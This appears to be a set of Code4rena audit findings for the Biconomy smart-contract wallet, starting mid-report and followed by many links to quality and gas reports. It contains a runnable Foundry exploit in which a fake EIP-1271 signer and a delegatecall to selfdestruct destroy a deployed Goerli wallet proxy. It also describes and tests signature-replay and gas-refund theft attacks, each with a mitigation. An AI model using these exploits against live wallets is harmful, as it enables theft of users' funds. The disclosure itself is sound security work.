`FakeSigner` that always returns `EIP1271_MAGIC_VALUE`  2. Hacker creates `MaliciousImplementation` that is fully controlled **ONLY** by the hacker 3. Hacker calls the smart wallets `execTransaction` function  1. The transaction set will call to the the contracts `updateImplementation` function to update the implementation to `MaliciousImplementation`. This is possible because `updateImplementation` permits being called from `address(this)`   2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 4. Implementation was updated to `MaliciousImplementation`  1. Hacker transfers all native and ERC20 tokens to himself  2. Hacker unstakes EOA funds from protocols   3. Hacker might try to ransom the protocol/EOAs to return to previous implementation 5. Proxy cannot be redeployed for the existing EOA  ### Foundry POC  The POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.  The POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.  The POC use a smart wallet proxy contract that is deployed on `goerli` chain: proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09  You will need to install a foundry. Please follow these instruction for the setup: https://book.getfoundry.sh/getting-started/installation  After installing, create a workdir by issuing the command: `forge init --no-commit`   Create the following file in `test/DestroyWalletAndStealFunds.t.sol`: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol";  contract Enum {     enum Operation {Call, DelegateCall} } interface SmartAccount {     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) external payable returns (bool success);      function getNonce(uint256 batchId) external view returns (uint256); } struct Transaction {         address to;         uint256 value;         bytes data;         Enum.Operation operation;         uint256 targetTxGas;     } struct FeeRefund {         uint256 baseGas;         uint256 gasPrice; //gasPrice or tokenGasPrice         uint256 tokenGasPriceFactor;         address gasToken;         address payable refundReceiver;     } contract FakeSigner {     bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;      // Always return valid EIP1271_MAGIC_VALUE     function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {         return EIP1271_MAGIC_VALUE;     } } contract SelfDestructingContract {     // All this does is self destruct and send funds to "to"     function selfDestruct(address to) external {         selfdestruct(payable(to));     } }  contract DestroyWalletAndStealFunds is Test {     SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);     address hacker = vm.addr(0x1337);     SelfDestructingContract sdc;     FakeSigner fs;     function setUp() public {         // Create self destruct contract         sdc = new SelfDestructingContract();         // Create fake signer         fs = new FakeSigner();          // Impersonate hacker         vm.startPrank(hacker);         // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker          bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);         // Create transaction specifing SelfDestructingContract as target and as a delegate call         Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);         // Create FeeRefund         FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));          bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));         // Add fake signature (r,s,v) to pass all requirments.         // v=0 to indicate eip-1271 signer "fakeSignerPadded" which will always return true         bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));         // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.         proxySmartAccount.execTransaction(transaction, 0, fr, signatures);         vm.stopPrank();     }      function testProxyDoesNotExist() public {         uint size;         // Validate that bytecode size of the proxy contract is 0 becuase of self destruct          address proxy = address(proxySmartAccount);         assembly {           size := extcodesize(proxy)         }         assertEq(size,0);     }      function testRevertWhenCallingWalletThroughProxy() public {         // Revert when trying to call a function in the proxy          proxySmartAccount.getNonce(0);     } } ```  To run the POC and validate that the proxy does not exist after destruction: ``` forge test -m testProxyDoesNotExist -v --fork-url="<GOERLI FORK RPC>" ```  Expected output:  ``` Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds [PASS] testProxyDoesNotExist() (gas: 4976) Test result: ok. 1 passed; 0 failed; finished in 4.51s ```  To run the POC and validate that the EOA cannot interact with the wallet after destruction: ``` forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url="<GOERLI FORK RPC>" ```  Expected output:  ``` Failing tests: Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds [FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092) ```  ## Tools Used  Foundry, VS Code  ## Recommended Mitigation Steps  The protocol should validate before calling `isValidSignature` that `_signer` is `owner` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xSmartContract-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L36   # Vulnerability details  ### Impact  Proxy.sol is an enforcer of the the user's wallet standard. In its fallback function, it calls the actual implementation in order to handle additional logic.  If Proxy.sol is called with no calldata and some msg.value, the call will reach the receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value.  This logic is never reached, the entire msg.value is just leaked.   ```js contracts/smart-contract-wallet/Proxy.sol:   35     36:     receive() external payable {   37:         emit Received(msg.value, msg.sender, "");   38:     } ```  ### Proof Of Concept  Because the implementation contract is a constant , although we can confirm whether the `receive()` function exists, a different vulnerability is exposed this time; Even if the proxy contract can receive ether with `receive()`, there is no withdraw function to withdraw this ether and ethers remain locked in the contract.   ### Recommended Mitigation Steps  Consider moving the `receive()` function to the implementation contract 
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111   # Vulnerability details  ## Impact Paymaster's signature can be replayed to drain their deposits  ## Proof of Concept  Scenario :  - user A is happy with biconomy and behaves well biconomy gives some sponsored tx using verifyingPaymaster -- let's say paymaster's signature as sig X - user A becomes not happy with biconomy for some reason and A wants to attack biconomy - user A delegate calls to Upgrader and upgrade it's sender contract to MaliciousAccount.sol - MaliciousAccount.sol does not check any nonce and everything else is same to SmartAccount(but they can also add some other details to amplify the attack, but let's just stick it this way) - user A uses sig X(the one that used before) to initiate the same tx over and over - user A earnes nearly nothing but paymaster will get their deposits drained   files : Upgrader.sol, MaliciousAccount.sol, test file https://gist.github.com/leekt/d8fb59f448e10aeceafbd2306aceaab2   ## Tools Used hardhat test, verified with livingrock  ## Recommended Mitigation Steps Since `validatePaymasterUserOp` function is not limited to view function in erc4337 spec, add simple boolean data for mapping if hash is used or not   ``` mapping(bytes32 => boolean) public usedHash      function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);         require(!usedHash[hash], "used hash");         usedHash[hash] = true; ```
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L429-L444   # Vulnerability details  ## Impact The submitter of a transaction is paid back the transaction's gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) * gasPrice / tokenGasPriceFactor$. `baseGas`, `gasPrice`, and `tokenGasPriceFactor` are values specified by the tx submitter. Since you don't want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, the `tokenGasPriceFactor` value is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ for `tokenGasPriceFactor`. That way they can increase the actual gas repayment and steal the user's funds.  ## Proof of Concept In `encodeTransactionData()` we can see that `tokenGasPriceFactor` is not included: ```sol     function encodeTransactionData(         Transaction memory _tx,         FeeRefund memory refundInfo,         uint256 _nonce     ) public view returns (bytes memory) {         bytes32 safeTxHash =             keccak256(                 abi.encode(                     ACCOUNT_TX_TYPEHASH,                     _tx.to,                     _tx.value,                     keccak256(_tx.data),                     _tx.operation,                     _tx.targetTxGas,                     refundInfo.baseGas,                     refundInfo.gasPrice,                     refundInfo.gasToken,                     refundInfo.refundReceiver,                     _nonce                 )             );         return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);     } ```  The value is used to determine the gas repayment in `handlePayment()` and `handlePaymentRevert()`: ```sol     function handlePayment(         uint256 gasUsed,         uint256 baseGas,         uint256 gasPrice,         uint256 tokenGasPriceFactor,         address gasToken,         address payable refundReceiver     ) private nonReentrant returns (uint256 payment) {         // uint256 startGas = gasleft();         // solhint-disable-next-line avoid-tx-origin         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;         if (gasToken == address(0)) {             // For ETH we will only adjust the gas price to not be higher than the actual used gas price             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);             (bool success,) = receiver.call{value: payment}("");             require(success, "BSA011");         } else {             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);             require(transferToken(gasToken, receiver, payment), "BSA012");         }         // uint256 requiredGas = startGas - gasleft();         //console.log("hp %s", requiredGas);     } ```  That's called at the end of `execTransaction()`: ```sol             if (refundInfo.gasPrice > 0) {                 //console.log("sent %s", startGas - gasleft());                 // extraGas = gasleft();                 payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);                 emit WalletHandlePayment(txHash, payment);             } ```  As an example, given that: - `gasUsed = 1,000,000` - `baseGas = 100,000` - `gasPrice = 10,000,000,000` (10 gwei) - `tokenGasPriceFactor = 18`  You get $(1,000,000 + 100,000) * 10,000,000,000 / 18 = 6.1111111e14$. If the submitter executes the transaction with `tokenGasPriceFactor = 1` they get $1.1e16$ instead, i.e. 18 times more. ## Tools Used none  ## Recommended Mitigation Steps `tokenGasPriceFactor` should be included in the encoded transaction data and thus verified by the user's signature.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chaduke-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chrisdior4-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/ladboy233-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chaduke-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/prady-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Bnke0x0-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/btk-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Bnke0x0-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/privateconstant-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/oyc_109-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/oyc_109-G.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212   # Vulnerability details  ## Impact Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never dissapears  ## Why it possible Contract checks `nonces[batchId]` but not `batchId` itself, so we could reuse other batches nounces. If before transaction we have `n` batches with the same nonce as transaction batch, then transaction can be replayed `n` times. Since there are 2^256 `batchId`s with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.  ## Proof of Concept Insert this test in `testGroup1.ts` right after `Should set the correct states on proxy` test:      it("replay EIP712 sign transaction", async function () {       await token       .connect(accounts[0])       .transfer(userSCW.address, ethers.utils.parseEther("100"));      const safeTx: SafeTransaction = buildSafeTransaction({       to: token.address,       data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),       nonce: await userSCW.getNonce(0),     });      const chainId = await userSCW.getChainId();     const { signer, data } = await safeSignTypedData(       accounts[0],       userSCW,       safeTx,       chainId     );      const transaction: Transaction = {       to: safeTx.to,       value: safeTx.value,       data: safeTx.data,       operation: safeTx.operation,       targetTxGas: safeTx.targetTxGas,     };     const refundInfo: FeeRefund = {       baseGas: safeTx.baseGas,       gasPrice: safeTx.gasPrice,       tokenGasPriceFactor: safeTx.tokenGasPriceFactor,       gasToken: safeTx.gasToken,       refundReceiver: safeTx.refundReceiver,     };      let signature = "0x";     signature += data.slice(2);       await expect(       userSCW.connect(accounts[2]).execTransaction(         transaction,         0, // batchId         refundInfo,         signature       )     ).to.emit(userSCW, "ExecutionSuccess");      //contract checks nonces[batchId] but not batchId itself     //so we can change batchId to the one that have the same nonce     //this would replay transaction     await expect(       userSCW.connect(accounts[2]).execTransaction(         transaction,         1, // changed batchId         refundInfo,         signature       )     ).to.emit(userSCW, "ExecutionSuccess");      //charlie would have 20 tokens after this     expect(await token.balanceOf(charlie)).to.equal(       ethers.utils.parseEther("20")     );     });  ## Recommended Mitigation Steps add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/csanuragjain-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/nadin-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Sathish9098-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/HE1M-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Raiders-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/arialblack14-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/RaymondFam-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/RaymondFam-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/pavankv-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xhacksmithh-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xhacksmithh-G.md).
